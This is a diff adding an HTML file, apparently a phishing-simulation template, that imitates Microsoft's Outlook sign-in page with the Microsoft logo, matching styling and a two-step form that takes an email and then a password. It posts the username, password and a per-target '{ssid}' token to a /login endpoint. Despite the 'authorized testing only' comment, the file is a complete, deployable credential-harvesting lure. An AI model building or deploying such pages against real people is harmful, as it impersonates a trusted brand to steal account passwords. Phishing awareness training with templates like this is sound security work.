@@ -1,0 +1,128 @@
+<!-- Microsoft — exact replica (2024) — FOR AUTHORIZED TESTING ONLY -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in to your account</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:"Segoe UI",SegoeUI,"Helvetica Neue",Helvetica,Arial,sans-serif;background:#f2f2f2;color:#1b1b1b;min-height:100vh;display:flex;flex-direction:column}
+  .bg{position:fixed;inset:0;background:#f2f2f2;z-index:-1}
+  .bg::before{content:"";position:absolute;inset:0;background:radial-gradient(ellipse at 30% 0%, #e6f0ff 0%, transparent 60%), radial-gradient(ellipse at 80% 100%, #fff 0%, transparent 50%)}
+  .wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
+  .card{width:100%;max-width:440px;background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:44px}
+  .logo{margin-bottom:16px}
+  .logo svg{height:24px}
+  h1{font-size:24px;font-weight:600;line-height:28px;margin:0 0 8px}
+  .sub{font-size:15px;line-height:20px;margin-bottom:24px}
+  .field{position:relative;margin-bottom:16px}
+  .field input{width:100%;height:36px;padding:6px 10px 6px 0;border:none;border-bottom:1px solid #8a8886;font-size:15px;outline:none;background:transparent}
+  .field input:focus{border-bottom-color:#0067b8}
+  .field input.has-error{border-bottom-color:#e81123}
+  .field label{position:absolute;left:0;top:50%;transform:translateY(-50%);color:#605e5c;font-size:15px;pointer-events:none;transition:.15s}
+  .field input:focus + label,.field input:not(:placeholder-shown) + label{top: -8px;font-size:12px;color:#0067b8}
+  .field input.has-error + label{color:#e81123}
+  .error{color:#e81123;font-size:12px;display:none;margin-top:4px}
+  .error.show{display:block}
+  .actions{display:flex;justify-content:flex-end;gap:4px;margin-top:24px}
+  .btn{height:32px;padding:0 24px;border:none;font-size:15px;font-weight:600;cursor:pointer}
+  .btn-primary{background:#0067b8;color:#fff;min-width:108px}
+  .btn-primary:hover{background:#005a9e}
+  .btn-primary:disabled{opacity:.6;pointer-events:none}
+  .btn-secondary{background:#fff;color:#000;border:1px solid #8a8886}
+  .btn-secondary:hover{background:#f3f2f1}
+  .links{margin-top:16px;font-size:13px}
+  .links a{color:#0067b8;text-decoration:none}
+  .links a:hover{text-decoration:underline;color:#004578}
+  .footer{max-width:440px;margin:0 auto;width:100%;padding:0 24px 24px;display:flex;justify-content:flex-end;gap:16px;font-size:12px}
+  .footer a{color:#000;text-decoration:none}
+  .footer a:hover{text-decoration:underline}
+  .dots{display:flex;gap:4px;justify-content:center;margin-top:24px}
+  .dots span{width:6px;height:6px;border-radius:50%;background:#000}
+  .dots span:nth-child(2){opacity:.4}
+  .dots span:nth-child(3){opacity:.2}
+  .step{display:none}
+  .step.active{display:block}
+  .back{display:flex;align-items:center;gap:8px;font-size:13px;color:#605e5c;margin-bottom:16px;cursor:pointer}
+  .user-pill{display:flex;align-items:center;gap:8px;font-size:15px;margin-bottom:16px}
+  .user-pill svg{width:32px;height:32px;background:#e6e6e6;border-radius:50%;padding:6px}
+  @media(max-width:480px){.card{padding:24px;box-shadow:none;max-width:100%}.wrap{padding:0;align-items:stretch;background:#fff}}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="wrap">
+  <div class="card">
+    <div class="logo">
+      <svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg"><g fill="none"><rect width="108" height="24" fill="none"/><path fill="#f25022" d="M0 0h11v11H0z"/><path fill="#80cc28" d="M13 0h11v11H13z"/><path fill="#00a4ef" d="M0 13h11v11H0z"/><path fill="#ffb900" d="M13 13h11v11H13z"/><text x="30" y="16" font-family="Segoe UI,Arial" font-size="16" font-weight="600" fill="#505050">Microsoft</text></g></svg>
+    </div>
+    <!-- Step 1 -->
+    <div id="step1" class="step active">
+      <h1>Sign in</h1>
+      <p class="sub">to continue to Outlook</p>
+      <form id="form1" novalidate>
+        <input type="hidden" name="ssid" value="{ssid}">
+        <div class="field">
+          <input id="email" name="username" type="email" placeholder=" " autocomplete="username" spellcheck="false" required autofocus>
+          <label for="email">Email, phone, or Skype</label>
+        </div>
+        <div class="error" id="err-email">Enter a valid email address.</div>
+        <div class="links"><a href="#">No account? Create one!</a> · <a href="#">Sign in with a security key</a></div>
+        <div class="actions">
+          <button type="button" class="btn btn-secondary" onclick="return false;">Back</button>
+          <button type="button" class="btn btn-primary" id="btn-next">Next</button>
+        </div>
+      </form>
+      <div class="links" style="margin-top:24px"><a href="#">Sign-in options</a></div>
+    </div>
+    <!-- Step 2 -->
+    <div id="step2" class="step">
+      <div class="back" id="btn-back"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#605e5c" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg> Back</div>
+      <div class="user-pill"><svg viewBox="0 0 24 24" fill="#605e5c"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg><span id="pill-email"></span></div>
+      <h1 style="font-size:20px">Enter password</h1>
+      <form id="login-form" method="POST" action="/login" novalidate>
+        <input type="hidden" name="ssid" value="{ssid}">
+        <input type="hidden" id="hidden-email" name="username" value="">
+        <div class="field">
+          <input id="password" name="password" type="password" placeholder=" " autocomplete="current-password" required>
+          <label for="password">Password</label>
+        </div>
+        <div class="error" id="err-pass">Please enter your password.</div>
+        <div class="links"><a href="#">Forgot my password</a></div>
+        <div class="actions">
+          <button type="submit" class="btn btn-primary" id="btn-submit">Sign in</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+<div class="footer"><a href="#">Terms of use</a><a href="#">Privacy & cookies</a><a href="#">...</a></div>
+<script>
+  const emailEl = document.getElementById('email');
+  const passEl = document.getElementById('password');
+  const hiddenEmail = document.getElementById('hidden-email');
+  const step1 = document.getElementById('step1');
+  const step2 = document.getElementById('step2');
+  function isValidEmail(v){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
+  document.getElementById('btn-next').addEventListener('click', ()=>{
+    const v = emailEl.value.trim();
+    const err = document.getElementById('err-email');
+    err.classList.remove('show'); emailEl.classList.remove('has-error');
+    if(!isValidEmail(v)){ err.textContent='Enter a valid email address.'; err.classList.add('show'); emailEl.classList.add('has-error'); return; }
+    document.getElementById('pill-email').textContent = v;
+    hiddenEmail.value = v;
+    step1.classList.remove('active'); step2.classList.add('active'); passEl.focus();
+  });
+  document.getElementById('btn-back').addEventListener('click', ()=>{ step2.classList.remove('active'); step1.classList.add('active'); emailEl.focus(); });
+  document.getElementById('login-form').addEventListener('submit', (e)=>{
+    const v = passEl.value;
+    const err = document.getElementById('err-pass');
+    err.classList.remove('show'); passEl.classList.remove('has-error');
+    if(!v){ err.classList.add('show'); passEl.classList.add('has-error'); e.preventDefault(); return; }
+    const btn = document.getElementById('btn-submit'); btn.textContent='Signing in…'; btn.disabled=true;
+  });
+  emailEl.addEventListener('input', ()=>{ document.getElementById('err-email').classList.remove('show'); emailEl.classList.remove('has-error'); });
+</script>
+</body>
+</html>
